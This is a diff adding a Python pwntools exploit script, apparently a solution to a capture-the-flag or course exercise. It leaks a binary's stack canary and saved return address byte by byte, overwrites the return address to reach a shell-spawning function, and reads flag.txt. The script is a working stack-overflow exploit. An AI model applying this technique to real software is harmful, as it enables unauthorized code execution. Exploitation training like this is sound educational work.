@@ -1,0 +1,72 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+
+exe = context.binary = ELF("./leak", checksec=False)
+context.log_level = "error"
+
+
+def start(argv=[], *a, **kw):
+    gdbscript = """
+    tbreak main
+    continue
+    """.format(
+        **locals()
+    )
+
+    if args.GDB:
+        context.log_level = "debug"
+        context.terminal = ["tmux", "split", "-h"]
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+
+def main():
+    io = start()
+    # add your exploit code here
+    io.recv()
+    depth = 10
+
+    stack_vars = [b''] * depth
+
+    # Get the Canary, saved rbp (which is actually saved rbx? No Stackframe?), saved rip and much other Stuff from the Stack
+    # This loop just saves 8 Bytes from the Stack with every iteration into an array
+    # We need to get the Addr of the saved rip where main (or _start is) 
+    # With it we can calculate givemeshellpls because we know the offset via readelf -s
+    for j in range(depth):
+        for i in range(40 + j * 8, 48 + j * 8):
+            io.send(cyclic(i))
+            val = io.recv()[i:-1] # remove \n from puts and start after cyclic trash
+
+            if val[0:1] == b'':   # If the returned string is empty, we have a Nullbyte, so we just append one to the string
+                stack_vars[j] += b'\x00'
+            else:                 # If not, it is a hexvalue, so append that
+                stack_vars[j] += val[0:1]
+
+        stack_vars[j] = hex(unpack(stack_vars[j]))
+
+    # Convert Canary back (we need to fix it) + convert new return addr back (main addr + offset to givemeashellpls; offset found via readelf -s leak)
+    # 9 because its the saved rip (_start) READ QUESTION ABOUT IT AT THE BOTTOM
+    canary = p64(int(stack_vars[0], 16))
+    saved_rip = p64(int(stack_vars[9], 16) + int("0x100", 16))
+
+    # Override Buffer (with \n, so the while Loop returns), then write canary, then rbp (does not matter), then return 
+    io.send(b'\n' + cyclic(39) + canary + cyclic(8) + saved_rip)
+    io.recv()
+    # Now we are in the Shell, so just print the flag via. cat (ret to givemeashellpls, it spawned one :D)
+    io.sendline(b'cat flag.txt')
+    print(io.recv().decode('utf-8')[:-1])
+
+    # A Question for this task
+    # 1. Why is leak pushing rbx into the stack at the entry of main?
+    # ==> It does not make a stack frame? Which is a little bit odd...
+    # ==> Also in rbx is the addr of main.... so we could technically calculate givemeashellpls with it
+    # But this approch only works on my local PC, not on your Container (look at the tests for the other commits)
+    # (Change Z.52 stack_vars to 1 and in int the hex value to -0x10)
+    # Was this on purpose? So we have an addr to work with?
+    # Anyways there were a few other addr. on the Stack (at stack_vars[7] is also main and at stack_vars[9] is _start)
+
+
+if __name__ == "__main__":
+    main()
